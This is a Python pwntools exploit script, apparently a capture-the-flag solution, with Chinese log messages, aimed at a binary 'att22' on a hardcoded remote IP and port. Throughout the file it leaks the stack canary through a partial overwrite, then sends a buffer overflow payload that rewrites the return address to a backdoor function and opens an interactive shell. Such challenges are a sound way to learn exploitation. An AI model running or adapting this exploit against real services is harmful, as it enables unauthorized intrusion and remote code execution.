from pwn import *
context.update(
    arch='amd64',
    os='linux',
    log_level='info',  
    terminal=['tmux', 'splitw', '-h']  
)
BINARY_PATH = './att22'
TARGET_HOST = '101.200.155.151'
TARGET_PORT = 12000
def main():
    elf = ELF(BINARY_PATH)
    log.info(f"加载二进制文件: {BINARY_PATH}")
    try:
        io = remote(TARGET_HOST, TARGET_PORT)
        log.success(f"成功连接到 {TARGET_HOST}:{TARGET_PORT}")
    except Exception as e:
        log.failure(f"连接失败: {e}")
        return


    backdoor_addr = elf.symbols.get('backdoor') or 0x4011AA
    log.info(f"后门函数地址: 0x{backdoor_addr:x}")


    io.sendlineafter('yes or no?', 'no')
    io.sendlineafter('so modest.', 'thanks')
    log.info("完成初始交互")


    leak_offset = 0x17
    leak_payload = b'A' * leak_offset + b'BC'

    io.sendafter('in init', leak_payload)
    io.recvuntil('B')

    try:
        canary_raw = io.recv(8)
        canary_value = u64(canary_raw) - ord('C')
        log.success(f"成功泄露Canary: 0x{canary_value:x}")
    except Exception as e:
        log.failure(f"Canary泄露失败: {e}")
        io.close()
        return
    payload_offset = 0x18
    exploit_payload = (
        b'A' * payload_offset +           
        p64(canary_value) +               
        p64(0) +                         
        p64(backdoor_addr)               
    )

    io.sendline(exploit_payload)
    log.info("已发送攻击载荷")


    try:
        log.info("尝试获取交互式shell...")
        io.interactive(prompt="已获取shell> ")
    except KeyboardInterrupt:
        log.info("用户中断，退出...")
    finally:
        io.close()

if __name__ == "__main__":
    main()